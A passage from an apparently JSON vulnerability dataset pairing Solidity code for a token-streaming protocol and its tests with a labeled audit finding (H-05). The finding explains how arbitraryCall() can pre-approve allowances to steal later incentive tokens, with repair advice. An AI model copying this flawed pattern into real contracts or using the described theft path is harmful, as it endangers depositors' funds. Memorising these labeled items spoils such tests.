StreamIncentivized(token, amt);\n    }\n\n    /**\n     *  @dev Allows the stream creator to claim an incentive once the stream is done\n    */ \n    function claimIncentive(address token) public lock {\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        uint112 amount = incentives[token];\n        require(amount > 0, \"amt\");\n        incentives[token] = 0;\n        ERC20(token).safeTransfer(msg.sender, amount);\n        emit StreamIncentiveClaimed(token, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder to reclaim deposit tokens if the deposit lock is done & their receiptToken amount\n     *  is greater than the requested amount\n    */ \n    function claimDepositTokens(uint112 amount) public lock {\n        require(!isSale, \"sale\");\n        // NOTE: given that endDepositLock is strictly *after* the last time withdraw or exit is callable\n        // we dont need to updateStream(msg.sender)\n        require(amount > 0, \"amt\");\n\n        // is the stream over + the deposit lock period over? thats the only time receiptTokens can be burned for depositTokens after stream is over\n        require(block.timestamp > endDepositLock, \"lock\");\n\n        // burn the receiptTokens\n        _burn(msg.sender, amount);\n\n        redeemedDepositTokens += amount;\n\n        // send the receipt token holder back the funds\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit DepositTokensReclaimed(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder (or original depositor in case of a sale) to claim their rewardTokens\n    */ \n    function claimReward() public lock {\n        require(block.timestamp > endRewardLock, \"lock\");\n\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        // accumulate reward per token info\n        cumulativeRewardPerToken = rewardPerToken();\n\n        // update user rewards\n        ts.rewards = earned(ts, cumulativeRewardPerToken);\n        // update users last cumulative reward per token\n        ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n        lastUpdate = lastApplicableTime();\n\n        uint256 rewardAmt = ts.rewards;\n        ts.rewards = 0;\n\n        require(rewardAmt > 0, \"amt\");\n\n        // transfer the tokens\n        ERC20(rewardToken).safeTransfer(msg.sender, rewardAmt);\n\n        emit RewardsClaimed(msg.sender, rewardAmt);\n    }\n\n    /**\n     *  @dev Allows a creator to claim sold tokens if the stream has ended & this contract is a sale\n    */ \n    function creatorClaimSoldTokens(address destination) public lock {\n        // can only claim when its a sale\n        require(isSale, \"!sale\");\n\n        // only can claim once\n        require(!claimedDepositTokens, \"claimed\");\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        \n        uint112 amount = depositTokenAmount;\n        claimedDepositTokens = true;\n\n        ERC20(depositToken).safeTransfer(destination, amount);\n\n        emit SoldTokensClaimed(destination, amount);\n    }\n\n    /**\n     *  @dev Allows the governance contract of the factory to select a destination\n     *  and transfer fees (in rewardTokens) to that address totaling the total fee amount\n    */ \n    function claimFees(address destination) public lock externallyGoverned {\n        // Stream is done\n        require(block.timestamp >= endStream, \"stream\");\n\n        // reset fee amount\n        uint112 fees = rewardTokenFeeAmount;\n        if (fees > 0) {\n            rewardTokenFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(rewardToken).safeTransfer(destination, fees);\n            emit FeesClaimed(rewardToken, destination, fees);\n        }\n\n        fees = depositTokenFlashloanFeeAmount;\n        if (fees > 0) {\n            depositTokenFlashloanFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(depositToken).safeTransfer(destination, fees);\n\n            emit FeesClaimed(depositToken, destination, fees);\n        }\n        \n    }\n\n    // ======== Non-protocol functions ========\n\n    /**\n     *  @dev Allows the stream creator to save tokens\n     *  There are some limitations to this:\n     *      1. if its deposit token:\n     *          - DepositLock is fully done\n     *          - There are excess deposit tokens (balance - depositTokenAmount)\n     *      2. if its the reward token:\n     *          - RewardLock is fully done\n     *          - Excess defined as balance - (rewardTokenAmount + rewardTokenFeeAmount)\n     *      3. if incentivized:\n     *          - excesss defined as bal - incentives[token]\n    */ \n    function recoverTokens(address token, address recipient) public lock {\n        // NOTE: it is the stream creators responsibility to save\n        // tokens on behalf of their users.\n        require(msg.sender == streamCreator, \"!creator\");\n        if (token == depositToken) {\n            require(block.timestamp > endDepositLock, \"time\");\n            // get the balance of this contract\n            // check what isnt claimable by either party\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n            // allow saving of the token\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n        \n        if (token == rewardToken) {\n            require(block.timestamp > endRewardLock, \"time\");\n            // check current balance vs internal balance\n            //\n            // NOTE: if a token rebases, i.e. changes balance out from under us,\n            // most of this contract breaks and rugs depositors. this isn't exclusive\n            // to this function but this function would in theory allow someone to rug\n            // and recover the excess (if it is worth anything)\n\n            // check what isnt claimable by depositors and governance\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        if (incentives[token] > 0) {\n            require(block.timestamp >= endStream, \"stream\");\n            uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];\n            ERC20(token).safeTransfer(recipient, excess);\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        // not reward token nor deposit nor incentivized token, free to transfer\n        uint256 bal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransfer(recipient, bal);\n        emit RecoveredTokens(token, recipient, bal);\n    }\n\n    /**\n     *  @dev Allows anyone to flashloan reward or deposit token for a 10bps fee\n    */\n    function flashloan(address token, address to, uint112 amount, bytes memory data) public lock {\n        require(token == depositToken || token == rewardToken, \"erc\");\n\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        ERC20(token).safeTransfer(to, amount);\n\n        // the `to` contract should have a public function with the signature:\n        // function lockeCall(address initiator, address token, uint256 amount, bytes memory data);\n        LockeCallee(to).lockeCall(msg.sender, token, amount, data);\n\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        uint112 feeAmt = amount * 10 / 10000; // 10bps fee\n\n        if (token == depositToken) {\n            depositTokenFlashloanFeeAmount += feeAmt;\n            require(preDepositTokenBalance + feeAmt <= postDepositTokenBalance, \"f1\");\n            require(preRewardTokenBalance <= postRewardTokenBalance, \"f2\");\n        } else {\n            rewardTokenFeeAmount += feeAmt;\n            require(preDepositTokenBalance <= postDepositTokenBalance, \"f3\");\n            require(preRewardTokenBalance + feeAmt <= postRewardTokenBalance, \"f4\");\n        }\n\n        emit Flashloaned(token, msg.sender, amount, feeAmt);\n    }\n\n    /**\n     *  @dev Allows inherited governance contract to call functions on behalf of this contract\n     *  This is a potentially dangerous function so to ensure trustlessness, *all* balances\n     *  that may matter are guaranteed to not change.\n     * \n     *  The primary usecase is for claiming potentially airdrops that may have accrued on behalf of this contract\n    */\n    function arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n        // cannot have an active incentive for the callee\n        require(incentives[who] == 0, \"inc\");\n        // cannot be to deposit token nor reward token\n        require(who != depositToken && who != rewardToken, \"erc\");\n\n        // get token balances\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        (bool success, bytes memory _ret) = who.call(data);\n        require(success);\n\n        // require no change in balances\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n        require(preDepositTokenBalance == postDepositTokenBalance && preRewardTokenBalance == postRewardTokenBalance, \"erc\");\n    }\n}\n\ncontract StreamFactory is Governed {\n\n    // ======= Structs ========\n    struct GovernableStreamParams {\n        uint32 maxDepositLockDuration;\n        uint32 maxRewardLockDuration;\n        uint32 maxStreamDuration;\n        uint32 minStreamDuration;\n    }\n\n    struct GovernableFeeParams {\n        uint16 feePercent;\n        bool feeEnabled;\n    }\n\n    // ======= Storage ========\n    GovernableStreamParams public streamParams;\n    GovernableFeeParams public feeParams;\n    uint64 public currStreamId; \n\n    uint16 constant MAX_FEE_PERCENT = 500; // 500/10000 == 5%\n\n    // =======  Events  =======\n    event StreamCreated(uint256 indexed stream_id, address stream_addr);\n    event StreamParametersUpdated(GovernableStreamParams oldParams, GovernableStreamParams newParams);\n    event FeeParametersUpdated(GovernableFeeParams oldParams, GovernableFeeParams newParams);\n\n    constructor(address _governor, address _emergency_governor) public Governed(_governor, _emergency_governor) {\n        streamParams = GovernableStreamParams({\n            maxDepositLockDuration: 52 weeks,\n            maxRewardLockDuration: 52 weeks,\n            maxStreamDuration: 2 weeks,\n            minStreamDuration: 1 hours\n        });\n    }\n\n    /**\n     * @dev Deploys a minimal contract pointing to streaming logic. This contract will also be the token contract\n     * for the receipt token. It custodies the depositTokens until depositLockDuration is complete. After\n     * lockDuration is completed, the depositTokens can be claimed by the original depositors\n     * \n    **/\n    function createStream(\n        address rewardToken,\n        address depositToken,\n        uint32 startTime,\n        uint32 streamDuration,\n        uint32 depositLockDuration,\n        uint32 rewardLockDuration,\n        bool isSale\n    )\n        public\n        returns (Stream)\n    {\n        // perform checks\n\n        {\n            require(startTime >= block.timestamp, \"past\");\n            require(streamDuration >= streamParams.minStreamDuration && streamDuration <= streamParams.maxStreamDuration, \"stream\");\n            require(depositLockDuration <= streamParams.maxDepositLockDuration, \"lock\");\n            require(rewardLockDuration <= streamParams.maxRewardLockDuration, \"reward\");\n        }\n        \n\n        // TODO: figure out sane salt, i.e. streamid + x? streamid guaranteed to be unique\n        uint64 that_stream = currStreamId;\n        currStreamId += 1;\n        bytes32 salt = bytes32(uint256(that_stream));\n\n        Stream stream = new Stream{salt: salt}(\n            that_stream,\n            msg.sender,\n            isSale,\n            rewardToken,\n            depositToken,\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration,\n            feeParams.feePercent,\n            feeParams.feeEnabled\n        );\n\n        emit StreamCreated(that_stream, address(stream));\n\n        return stream;\n    }\n\n    function updateStreamParams(GovernableStreamParams memory newParams) public governed {\n        // DATA VALIDATION:\n        //  there is no real concept of \"sane\" limits here, and if misconfigured its ultimated\n        //  not a massive deal so no data validation is done\n        GovernableStreamParams memory old = streamParams;\n        streamParams = newParams;\n        emit StreamParametersUpdated(old, newParams);\n    }\n\n    function updateFeeParams(GovernableFeeParams memory newFeeParams) public governed {\n        require(newFeeParams.feePercent <= MAX_FEE_PERCENT, \"fee\");\n        GovernableFeeParams memory old = feeParams;\n        feeParams = newFeeParams;\n        emit FeeParametersUpdated(old, newFeeParams);\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.10;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {DSInvariantTest} from \"./utils/DSInvariantTest.sol\";\n\nimport {MockERC20} from \"./utils/mocks/MockERC20.sol\";\nimport {ERC20User} from \"./utils/users/ERC20User.sol\";\n\ncontract ERC20Test is DSTestPlus {\n    MockERC20 token;\n\n    function setUp() public {\n        token = new MockERC20(\"Token\", \"TKN\", 18);\n    }\n\n    function invariantMetadata() public {\n        assertEq(token.name(), \"Token\");\n        assertEq(token.symbol(), \"TKN\");\n        assertEq(token.decimals(), 18);\n    }\n\n    function testMetaData(\n        string calldata name,\n        string calldata symbol,\n        uint8 decimals\n    ) public {\n        MockERC20 tkn = new MockERC20(name, symbol, decimals);\n        assertEq(tkn.name(), name);\n        assertEq(tkn.symbol(), symbol);\n        assertEq(tkn.decimals(), decimals);\n    }\n\n    function testMint(address from, uint256 amount) public {\n        token.mint(from, amount);\n\n        assertEq(token.totalSupply(), amount);\n        assertEq(token.balanceOf(from), amount);\n    }\n\n    function testBurn(\n        address from,\n        uint256 mintAmount,\n        uint256 burnAmount\n    ) public {\n        if (burnAmount > mintAmount) return;\n\n        token.mint(from, mintAmount);\n        token.burn(from, burnAmount);\n\n        assertEq(token.totalSupply(), mintAmount - burnAmount);\n        assertEq(token.balanceOf(from), mintAmount - burnAmount);\n    }\n\n    function testApprove(address from, uint256 amount) public {\n        assertTrue(token.approve(from, amount));\n\n        assertEq(token.allowance(address(this), from), amount);\n    }\n\n    function testTransfer(address from, uint256 amount) public {\n        token.mint(address(this), amount);\n\n        assertTrue(token.transfer(from, amount));\n        assertEq(token.totalSupply(), amount);\n\n        if (address(this) == from) {\n            assertEq(token.balanceOf(address(this)), amount);\n        } else {\n            assertEq(token.balanceOf(address(this)), 0);\n            assertEq(token.balanceOf(from), amount);\n        }\n    }\n\n    function testTransferFrom(\n        address to,\n        uint256 approval,\n        uint256 amount\n    ) public {\n        if (amount > approval) return;\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), amount);\n\n        from.approve(address(this), approval);\n\n        assertTrue(token.transferFrom(address(from), to, amount));\n        assertEq(token.totalSupply(), amount);\n\n        uint256 app = address(from) == address(this) || approval == type(uint256).max ? approval : approval - amount;\n        assertEq(token.allowance(address(from), address(this)), app);\n\n        if (address(from) == to) {\n            assertEq(token.balanceOf(address(from)), amount);\n        } else {\n            assertEq(token.balanceOf(address(from)), 0);\n            assertEq(token.balanceOf(to), amount);\n        }\n    }\n\n    function testFailTransferFromInsufficientAllowance(\n        address to,\n        uint256 approval,\n        uint256 amount\n    ) public {\n        require(approval < amount);\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), amount);\n        from.approve(address(this), approval);\n        token.transferFrom(address(from), to, amount);\n    }\n\n    function testFailTransferFromInsufficientBalance(\n        address to,\n        uint256 mintAmount,\n        uint256 sendAmount\n    ) public {\n        require(mintAmount < sendAmount);\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), mintAmount);\n        from.approve(address(this), sendAmount);\n        token.transferFrom(address(from), to, sendAmount);\n    }\n}\n\ncontract ERC20Invariants is DSTestPlus, DSInvariantTest {\n    BalanceSum balanceSum;\n    MockERC20 token;\n\n    function setUp() public {\n        token = new MockERC20(\"Token\", \"TKN\", 18);\n        balanceSum = new BalanceSum(token);\n\n        addTargetContract(address(balanceSum));\n    }\n\n    function invariantBalanceSum() public {\n        assertEq(token.totalSupply(), balanceSum.sum());\n    }\n}\n\ncontract BalanceSum {\n    MockERC20 token;\n    uint256 public sum;\n\n    constructor(MockERC20 _token) {\n        token = _token;\n    }\n\n    function mint(address from, uint256 amount) public {\n        token.mint(from, amount);\n        sum += amount;\n    }\n\n    function burn(address from, uint256 amount) public {\n        token.burn(from, amount);\n        sum -= amount;\n    }\n\n    function approve(address to, uint256 amount) public {\n        token.approve(to, amount);\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public {\n        token.transferFrom(from, to, amount);\n    }\n\n    function transfer(address to, uint256 amount) public {\n        token.transfer(to, amount);\n    }\n}\n\n\n",
        "CodeNames": [
            "Locke.sol",
            "ERC20.t.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-05",
                "Location": [
                    "arbitraryCall()",
                    "createIncentive()",
                    "transferFrom"
                ],
                "Type": " Possible incentive theft through the arbitraryCall() function",
                "Description": "\n\nThe Locke.arbitraryCall() function allows the inherited governance contract to perform arbitrary contract calls within certain constraints. Contract calls to tokens provided as incentives through the createIncentive() function are not allowed if there is some still some balance according to the incentives mapping (See line 735 referenced below).\n\nHowever, the token can still be called prior any user creating an incentive, so it's possible for the arbitraryCall() function to be used to set an allowance on an incentive token before the contract has actually received any of the token through createIncentive().\n\nIn summary:\n\n1.  If some possible incentive tokens are known prior to being provided, the arbitraryCall() function can be used to pre-approve a token allowance for a malicious recipient.\n2.  Once a user calls createIncentive() and provides one of the pre-approved tokens, the malicious recipient can call transferFrom on the provided incentive token and withdraw the tokens.\n\n\n<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L735\n\n",
                "Repair": "\n##### Recommendation 1\n\nLimit the types of incentive tokens so it can be checked that it's not the target contract for the arbitraryCall().\n\n##### Recommendation 2\n\nValidate that the allowance of the target contract (if available) has not changed.\n\nbrockelmore (Streaming Protocol) confirmed(https://github.com/code-423n4/2021-11-streaming-findings/issues/199#issuecomment-989280130)\n\n\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.10;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {DSInvariantTest} from \"./utils/DSInvariantTest.sol\";\n\nimport {SafeTransferLib} from \"../utils/SafeTransferLib.sol\";\n\nimport {WETH} from \"../tokens/WETH.sol\";\n\ncontract WETHTest is DSTestPlus {\n    WETH weth;\n\n    function setUp() public {\n        weth = new WETH();\n    }\n\n    function testDeposit() public {\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        SafeTransferLib.safeTransferETH(address(weth), 1 ether);\n\n        assertEq(weth.balanceOf(address(this)), 1 ether);\n        assertEq(weth.totalSupply(), 1 ether);\n    }\n\n    function testFallbackDeposit() public {\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        weth.deposit{value: 1 ether}();\n\n        assertEq(weth.balanceOf(address(this)), 1 ether);\n        assertEq(weth.totalSupply(), 1 ether);\n    }\n\n    function testWithdraw() public {\n        uint256 startingBalance = address(this).balance;\n\n        weth.deposit{value: 1 ether}();\n\n        weth.withdraw(1 ether);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, startingBalance);\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n    }\n\n    function testPartialWithdraw() public {\n        weth.deposit{value: 1 ether}();\n\n        uint256 balanceBeforeWithdraw = address(this).balance;\n\n        weth.withdraw(0.5 ether);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, balanceBeforeWithdraw + 0.5 ether);\n        assertEq(weth.balanceOf(address(this)), 0.5 ether);\n        assertEq(weth.totalSupply(), 0.5 ether);\n    }\n\n    function testDeposit(uint256 amount) public {\n        if (amount > address(this).balance) return;\n\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        SafeTransferLib.safeTransferETH(address(weth), amount);\n\n        assertEq(weth.balanceOf(address(this)), amount);\n        assertEq(weth.totalSupply(), amount);\n    }\n\n    function testFallbackDeposit(uint256 amount) public {\n        if (amount > address(this).balance) return;\n\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        weth.deposit{value: amount}();\n\n        assertEq(weth.balanceOf(address(this)), amount);\n        assertEq(weth.totalSupply(), amount);\n    }\n\n    function testWithdraw(uint256 depositAmount, uint256 withdrawAmount) public {\n        if (depositAmount > address(this).balance) return;\n        if (withdrawAmount > depositAmount) return;\n\n        weth.deposit{value: depositAmount}();\n\n        uint256 balanceBeforeWithdraw = address(this).balance;\n\n        weth.withdraw(withdrawAmount);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, balanceBeforeWithdraw + withdrawAmount);\n        assertEq(weth.balanceOf(address(this)), depositAmount - withdrawAmount);\n        assertEq(weth.totalSupply(), depositAmount - withdrawAmount);\n    }\n\n    receive() external payable {}\n}\n\ncontract WETHInvariants is DSTestPlus, DSInvariantTest {\n    WETHTester wethTester;\n    WETH weth;\n\n    function setUp() public {\n        weth = new WETH();\n        wethTester = new WETHTester{value: address(this).balance}(weth);\n\n        addTargetContract(address(wethTester));\n    }\n\n    function invariantTotalSupplyEqualsBalance() public {\n        assertEq(address(weth).balance, weth.totalSupply());\n    }\n}\n\ncontract WETHTester {\n    WETH weth;\n\n    constructor(WETH _weth) payable {\n        weth = _weth;\n    }\n\n    function deposit(uint256 amount) public {\n        weth.deposit{value: amount}();\n    }\n\n    function fallbackDeposit(uint256 amount) public {\n        SafeTransferLib.safeTransferETH(address(weth), amount);\n    }\n\n    function withdraw(uint256 amount) public {\n        weth.withdraw(amount);\n    }\n\n    receive() external payable {}\n}\n\n\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"./utils/LockeTest.sol\";\n\n\n\ncontract StreamTest is LockeTest {\n    bool enteredFlashloan = false;\n\n    function test_fundStream() public {\n        // === Setup ===\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint112 amt = 1337;\n        emit log_named_uint(\"blocktime\", block.timestamp);\n        {\n            uint64 nextStream = defaultStreamFactory.currStreamId();\n            emit log_named_uint(\"nextStream\", nextStream);\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                uint32(block.timestamp + 10), // 10 seconds in future\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n                // false,\n                // bytes32(0)\n            );\n\n            testTokenA.approve(address(stream), type(uint256).max);\n            // ===   ===\n\n\n            // === Failures ===\n            bytes4 sig = sigs(\"fundStream(uint112)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(0),\n                \"amt\"\n            );\n            hevm.warp(block.timestamp + 11);\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(amt),\n                \"time\"\n            );\n            hevm.warp(block.timestamp - 11);\n            // ===   ===\n\n            \n\n\n            // === No Fees ===\n\n            uint256 gas_left = gasleft();\n            stream.fundStream(amt);\n            emit log_named_uint(\"gas_usage_no_fee\", gas_left - gasleft());\n            (uint112 rewardTokenAmount, uint112 _unused, uint112 rewardTokenFeeAmount, ) = stream.tokenAmounts();\n            assertEq(rewardTokenAmount, amt);\n            assertEq(rewardTokenFeeAmount, 0);\n            assertEq(testTokenA.balanceOf(address(stream)), 1337);\n            // ===    ===\n        }\n\n\n        {\n            // === Fees Enabled ====\n            defaultStreamFactory.updateFeeParams(StreamFactory.GovernableFeeParams({\n                feePercent: 100,\n                feeEnabled: true\n            }));\n            uint256 nextStream = defaultStreamFactory.currStreamId();\n            emit log_named_uint(\"nextStream2\", nextStream);\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                uint32(block.timestamp + 10), // 10 seconds in future\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                false\n                // false,\n                // bytes32(0)\n            );\n\n            testTokenA.approve(address(stream), type(uint256).max);\n\n            uint112 feeAmt = 13; // expected fee amt\n            uint256 gas_left = gasleft();\n            stream.fundStream(amt);\n            emit log_named_uint(\"gas_usage_w_fee\", gas_left - gasleft());\n            (uint112 rewardTokenAmount, uint112 _unused, uint112 rewardTokenFeeAmount, ) = stream.tokenAmounts();\n            assertEq(rewardTokenAmount, amt - feeAmt);\n            assertEq(rewardTokenFeeAmount, feeAmt);\n            assertEq(testTokenA.balanceOf(address(stream)), 1337);\n        }\n    }\n\n    function test_multiUserStake() public {\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint32 startTime = uint32(block.timestamp + 10);\n        Stream stream = defaultStreamFactory.createStream(\n            address(testTokenA),\n            address(testTokenB),\n            startTime,\n            minStreamDuration,\n            maxDepositLockDuration,\n            0,\n            false\n            // false\n            // bytes32(0)\n        );\n\n        testTokenA.approve(address(stream), type(uint256).max);\n        stream.fundStream(1000);\n\n        alice.doStake(stream, address(testTokenB), 100);\n\n\n        hevm.warp(startTime + minStreamDuration / 2); // move to half done\n        \n        bob.doStake(stream, address(testTokenB), 100);\n\n        hevm.warp(startTime + minStreamDuration + 1); // warp to end of stream\n\n        alice.doClaimReward(stream);\n        assertEq(testTokenA.balanceOf(address(alice)), 666);\n        bob.doClaimReward(stream);\n        assertEq(testTokenA.balanceOf(address(bob)), 333);\n    }\n\n    function test_multiUserStakeWithWithdraw() public {\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint32 startTime = uint32(block.timestamp + 10);\n        Stream stream = defaultStreamFactory.createStream(\n            address(testTokenA),\n            address(testTokenB),\n            startTime,\n            minStreamDuration,\n            maxDepositLockDuration,\n            0,\n            false\n            // false\n            // bytes32(0)\n        );\n\n        testTokenA.approve(address(stream), type(uint256).max);\n        stream.fundStream(1000);\n\n        alice.doStake(stream, address(testTokenB), 100);\n\n\n        hevm.warp(startTime + minStreamDuration / 2); // move to half done\n        \n        bob.doStake(stream, address(testTokenB), 100);\n\n        hevm.warp(startTime + minStreamDuration / 2 + minStreamDuration / 10);\n\n        alice.doExit(stream); \n\n        hevm.warp(startTime + minStreamDuration + 1); // warp to end of stream\n\n\n        alice.doClaimReward(stream);\n        assertEq(testTokenA.balanceOf(address(alice)), 533);\n        bob.doClaimReward(stream);\n        assertEq(testTokenA.balanceOf(address(bob)), 466);\n    }\n\n    function test_stake() public {\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint32 startTime = uint32(block.timestamp + 10);\n        Stream stream = defaultStreamFactory.createStream(\n            address(testTokenA),\n            address(testTokenB),\n            startTime,\n            minStreamDuration,\n            maxDepositLockDuration,\n            0,\n            false\n            // false,\n            // bytes32(0)\n        );\n\n        testTokenB.approve(address(stream), type(uint256).max);\n\n        {\n            // Failures\n            bytes4 sig = sigs(\"stake(uint112)\");\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(0),\n                \"amt\"\n            );\n\n            // fast forward minStreamDuration\n            hevm.warp(startTime + minStreamDuration);\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(100),\n                \"!stream\"\n            );\n            hevm.warp(startTime - minStreamDuration);\n\n            write_balanceOf(address(testTokenB), address(stream), 2**112 + 1);\n            expect_revert_with(\n                address(stream),\n                sig,\n                abi.encode(100),\n                \"erc\"\n            );\n            write_balanceOf(address(testTokenB), address(stream), 0);\n        }\n\n        {\n            // Successes\n            stream.stake(100);\n            LockeERC20 asLERC = LockeERC20(stream);\n            assertEq(asLERC.balanceOf(address(this)), 100);\n\n            {\n                (uint112 rewardTokenAmount, uint112 depositTokenAmount, uint112 rewardTokenFeeAmount, ) = stream.tokenAmounts();\n                assertEq(depositTokenAmount, 100);\n            }\n            \n\n            {\n                uint112 unstreamed = stream.unstreamed();\n                assertEq(unstreamed, 100);\n            }\n            \n            {\n                (uint256 lastCumulativeRewardPerToken, uint256 virtualBalance, uint112 rewards, uint112 tokens, uint32 lu, ) = stream.tokensNotYetStreamed(address(this));\n                assertEq(lastCumulativeRewardPerToken, 0);\n                assertEq(virtualBalance, 100);\n                assertEq(tokens, 100);\n                assertEq(lu, startTime);\n            }\n            \n\n            // move forward 1/10th of sd\n            // round up to next second\n            hevm.warp(startTime + minStreamDuration / 10 + 1);\n            uint256 rewardPerToken = stream.rewardPerToken();\n            stream.stake(1);\n            \n            {\n                uint112 unstreamed = stream.unstreamed();\n                assertEq(unstreamed, 91);\n            }\n\n            {\n                (uint256 lastCumulativeRewardPerToken, uint256 virtualBalance, uint112 rewards, uint112 tokens, uint32 lu, ) = stream.tokensNotYetStreamed(address(this));\n                assertEq(lastCumulativeRewardPerToken, rewardPerToken);\n                assertEq(virtualBalance, 101);\n                assertEq(tokens, 91);\n                assertEq(lu, block.timestamp);\n            }\n            \n\n            hevm.warp(startTime + (2*minStreamDuration) / 10 + 1);\n            rewardPerToken = stream.rewardPerToken();\n            stream.stake(1);\n            \n            {\n                uint112 unstreamed = stream.unstreamed();\n                assertEq(unstreamed, 82);\n            }\n\n            {\n                (uint256 lastCumulativeRewardPerToken, uint256 virtualBalance, uint112 rewards, uint112 tokens, uint32 lu, ) = stream.tokensNotYetStreamed(address(this));\n                assertEq(lastCumulativeRewardPerToken, rewardPerToken);\n                assertEq(virtualBalance, 102);\n                assertEq(tokens, 82);\n                assertEq(lu, block.timestamp);\n            }\n            \n\n        }\n        {\n            hevm.warp(1609459200); // jan 1, 2021          \n            // Sale test\n            Stream stream = defaultStreamFactory.createStream(\n                address(testTokenA),\n                address(testTokenB),\n                startTime,\n                minStreamDuration,\n                maxDepositLockDuration,\n                0,\n                true\n                // false,\n                // bytes32(0)\n            );\n            testTokenB.approve(address(stream), type(uint256).max);\n            stream.stake(100);\n            LockeERC20 asLERC = LockeERC20(stream);\n            // no tokens wen sale\n            assertEq(asLERC.balanceOf(address(this)), 0);\n\n            (uint112 rewardTokenAmount, uint112 depositTokenAmount, uint112 rewardTokenFeeAmount, ) = stream.tokenAmounts();\n            assertEq(depositTokenAmount, 100);\n            (uint256 lastCumulativeRewardPerToken, uint256 virtualBalance, uint112 rewards, uint112 tokens, uint32 lu, ) = stream.tokensNotYetStreamed(address(this));\n            assertEq(tokens, 100);\n        }\n    }\n\n    function test_createIncentive() public {\n        (\n            uint32 maxDepositLockDuration,\n            uint32 maxRewardLockDuration,\n            uint32 maxStreamDuration,\n            uint32 minStreamDuration\n        ) = defaultStreamFactory.streamParams();\n\n        uint32 startTime = uint32(block.timestamp + 10);\n        Stream stream = defaultStreamFactory.createStream(\n            address(testTokenA),\n            address(testTokenB),\n            startTime,\n            minStreamDuration,\n            maxDepositLockDuration,\n            0,\n            false\n            // false,\n            // bytes32(0)\n        );\n\n        bytes4 sig = sigs(\"createIncentive(address,uint112)\");\n        expect_revert_with(\n            address(stream),\n            